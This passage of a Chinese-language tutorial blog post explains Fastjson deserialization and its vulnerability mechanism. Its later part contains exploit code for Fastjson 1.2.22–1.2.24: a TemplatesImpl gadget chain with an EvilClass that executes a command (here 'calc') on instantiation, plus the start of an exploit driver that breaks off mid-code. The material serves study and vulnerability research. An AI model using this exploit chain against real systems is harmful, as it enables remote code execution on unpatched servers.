<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span><span class="token class-name">JSONObject</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestFastJsonDeserialize</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parseObject方法进行反序列化，未指定class，返回一个JSONObject对象："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">JSONObject</span> obj <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parseObject方法进行反序列化，指定class，返回相应的类："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj02 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj02<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"通过parse方法进行反序列化，返回相应的类："</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj03 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">)</span>JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj03<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出：</p>
<pre class="line-numbers language-none"><code class="language-none">通过parseObject方法进行反序列化，未指定class，返回一个JSONObject对象：
Student构造函数
Student setAge
Student setName
Student getAge
Student getName
{"name":"Hello Fastjson!","age":18}
com.alibaba.fastjson.JSONObject

通过parseObject方法进行反序列化，指定class，返回相应的类：
Student构造函数
Student setAge
Student setName
fastjson.Student@2957fcb0
fastjson.Student

通过parse方法进行反序列化，返回相应的类：
Student构造函数
Student setAge
Student setName
fastjson.Student@1376c05c
fastjson.Student<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="parseObject-方法的Feature-SupportNonPublicField属性"><a href="#parseObject-方法的Feature-SupportNonPublicField属性" class="headerlink" title="parseObject()方法的Feature.SupportNonPublicField属性"></a><code>parseObject()</code>方法的<code>Feature.SupportNonPublicField</code>属性</h4><p>Fastjson默认不会反序列化私有属性，若想对私有属性进行反序列化，则需要在<code>parseObject()</code>方法添加一个属性<code>Feature.SupportNonPublicField</code>。</p>
<p>举个例子：</p>
<p>我们稍微修改一下<code>Student</code>类，把私有属性age的<code>setter</code>方法去掉（如果不去掉，Fastjson依然是能反序列化成功的，因为你提供了这个接口），作为对比，我们把name属性设置为<code>public</code>，并且也注释掉<code>setter</code>方法：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
<span class="token comment">//    private String name;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setName(String name) {
        System.out.println("Student setName");
        this.name = name;
    }*/</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setAge(int age) {
        System.out.println("Student setAge");
        this.age = age;
    }*/</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后反序列化（注意将<code>TestFastJson.java</code>全部注释掉）：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出如下，发现未设置<code>Feature.SupportNonPublicField</code>时，私有属性age为0，即没有赋值成功，而同样没有<code>setter</code>方法的公有属性name却可以赋值成功。</p>
<pre class="line-numbers language-none"><code class="language-none"># 设置了Feature.SupportNonPublicField属性
Student构造函数
fastjson.Student@2d8e6db6
fastjson.Student
Student getName
Student getAge
Hello Fastjson! 18

# 未设置Feature.SupportNonPublicField属性
Student构造函数
fastjson.Student@2d8e6db6
fastjson.Student
Student getName
Student getAge
Hello Fastjson! 0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="Fastjson反序列化漏洞原理"><a href="#Fastjson反序列化漏洞原理" class="headerlink" title="Fastjson反序列化漏洞原理"></a>Fastjson反序列化漏洞原理</h2><p>从前文可知，Fastjson是自己实现的一套序列化和反序列化机制，不是用的Java原生的序列化和反序列化机制。</p>
<p>无论是哪个版本，Fastjson反序列化漏洞的原理都是一样的，只不过不同版本是针对不同的黑名单或者借助不同利用链来进行绕过利用而已。</p>
<p><strong>那么如何才能找到这种有危险操作的类呢？</strong></p>
<p>前文中，我们知道Fastjson使用<code>parseObject()</code>/<code>parse()</code>进行反序列化的时候可以指定类型。。有两种情况我们有可乘之机：</p>
<p>1、反序列化指定某个具体类，开发者实现的这个具体类中就包含了危险操作；</p>
<p>2、反序列化指定的类很大，包含了很多子类，并且在不在反序列化的黑名单内。极端情况，如Object或JSONObject，则可以反序列化出来任意类。例如代码<code>Object o = JSON.parseObject(poc,Object.class)</code>就可以反序列化出Object类或其任意子类，而Object又是任意类的父类，所以就可以反序列化出所有类。这种情况下，带有危险操作的类就会有很多。</p>
<p><strong>那么如何才能触发反序列化得到的危险操作类中的危险函数呢？</strong></p>
<p>从前文可知，Fastjson在反序列化时，可能会将目标类的构造函数、<code>getter</code>方法、<code>setter</code>方法、<code>is</code>方法执行一遍，如果此时这四个方法中有危险操作，就会导致反序列化漏洞。换句话说，就是攻击者传入要进行反序列化的类中的构造函数、<code>getter</code>方法、<code>setter</code>方法、<code>is</code>方法中要存在漏洞才能触发。</p>
<p>举个例子：</p>
<p>我们在setName()函数中加入了一个危险操作：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">fastjson</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Student</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">String</span> name<span class="token punctuation">;</span>
<span class="token comment">//    private String name;</span>
    <span class="token keyword">private</span> <span class="token keyword">int</span> age<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">Student</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student构造函数"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setName</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student setName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>name <span class="token operator">=</span> name<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Student getAge"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> age<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

<span class="token comment">/*    public void setAge(int age) {
        System.out.println("Student setAge");
        this.age = age;
    }*/</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后反序列化，便可弹出计算器</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> jsonString <span class="token operator">=</span><span class="token string">"{\"@type\":\"fastjson.Student\",\"age\":18,\"name\":\"Hello Fastjson!\"}"</span><span class="token punctuation">;</span>
<span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span> obj04 <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parseObject</span><span class="token punctuation">(</span>jsonString<span class="token punctuation">,</span> <span class="token class-name"><span class="token namespace">fastjson<span class="token punctuation">.</span></span>Student</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> <span class="token class-name">Feature<span class="token punctuation">.</span>SupportNonPublicField</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj04<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> obj04<span class="token punctuation">.</span><span class="token function">getAge</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20231130175346825.png"></p>
<p>上述就是反序列化具体类的场景，若是反序列化一个大类（抽象类）如下：</p>
<pre class="line-numbers language-none"><code class="language-none">Object obj04 = JSON.parseObject(jsonString, Object.class, Feature.SupportNonPublicField);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>小结一下，关键是要找出一个在目标环境中已存在的类，满足如下两个条件：</p>
<ol>
<li>该类的构造函数、<code>setter</code>方法、<code>getter</code>方法、<code>is</code>方法中的某一个存在危险操作；</li>
<li>可以控制该漏洞函数的变量（一般就是该类的属性）；</li>
</ol>
<h2 id="反序列化漏洞（一）——1-2-22-1-2-24"><a href="#反序列化漏洞（一）——1-2-22-1-2-24" class="headerlink" title="反序列化漏洞（一）——1.2.22-1.2.24"></a>反序列化漏洞（一）——1.2.22-1.2.24</h2><h3 id="基于TemplatesImpl的利用链"><a href="#基于TemplatesImpl的利用链" class="headerlink" title="基于TemplatesImpl的利用链"></a>基于<code>TemplatesImpl</code>的利用链</h3><h4 id="限制条件"><a href="#限制条件" class="headerlink" title="限制条件"></a>限制条件</h4><p>需要设置<code>Feature.SupportNonPublicField</code>进行反序列化操作才能成功触发利用。</p>
<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>笔者复现用到的jar包：fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar</p>
<p>在刚才的项目中，新建一个含有危险操作（弹计算器）的类<code>EvilClass.java</code></p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span>DOM<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span></span><span class="token class-name">TransletException</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>runtime<span class="token punctuation">.</span></span><span class="token class-name">AbstractTranslet</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>dtm<span class="token punctuation">.</span></span><span class="token class-name">DTMAxisIterator</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>serializer<span class="token punctuation">.</span></span><span class="token class-name">SerializationHandler</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">EvilClass</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractTranslet</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token string">"calc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span><span class="token punctuation">[</span><span class="token punctuation">]</span> handlers<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">transform</span><span class="token punctuation">(</span><span class="token class-name">DOM</span> document<span class="token punctuation">,</span> <span class="token class-name">DTMAxisIterator</span> iterator<span class="token punctuation">,</span> <span class="token class-name">SerializationHandler</span> handler<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">TransletException</span> <span class="token punctuation">{</span>

    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
        <span class="token class-name">EvilClass</span> t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">EvilClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>然后新建一个利用代码<code>TemplatesImpl_Exp.java</code>，作为漏洞入口，其中27行<code>readClass()</code>方法用于读取<code>EvilClass.class</code>文件，并进行base64编码。由于反序列化中<code>_bytecodes</code>、<code>_tfactory</code>等都是私有属性，因此<code>parseObject()</code>需要参数<code>Feature.SupportNonPublicField</code>。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token class-name">TemplatesImpl_Exploit</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">ParserConfig</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>codec<span class="token punctuation">.</span>binary<span class="token punctuation">.</span></span><span class="token class-name">Base64</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOUtils</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span></span>JSON<span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>fastjson<span class="token punctuation">.</span>parser<span class="token punctuation">.</span></span><span class="token class-name">Feature</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">File</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TemplatesImpl_Exp</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token class-name">String</span> <span class="token function">readClass</span><span class="token punctuation">(</span><span class="token class-name">String</span> cls<span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token class-name">ByteArrayOutputStream</span> bos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">IOUtils</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span>cls<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> bos<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">encodeBase64String</span><span class="token punctuation">(</span>bos<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span> args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
        <span class="token keyword">try</span> <span class="token punctuation">{</span>
            <span class="token class-name">ParserConfig</span> config <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParserConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> evilClassPath <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"file.separator"</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"target/classes/TemplatesImpl_Exploit/EvilClass.class"</span><span class="token punctuation">;</span>
            <span class="token class-name">String</span> evilCode <span class="token operator">=</span> <span class="token function">readClass</span><span class="token punctuation">(</span>evilClassPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">final</span> <span class="token class-name">String</span> NASTY_CLASS <span class="token operator">=</span> <span class="token string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span><span class="token punctuation">;</span>
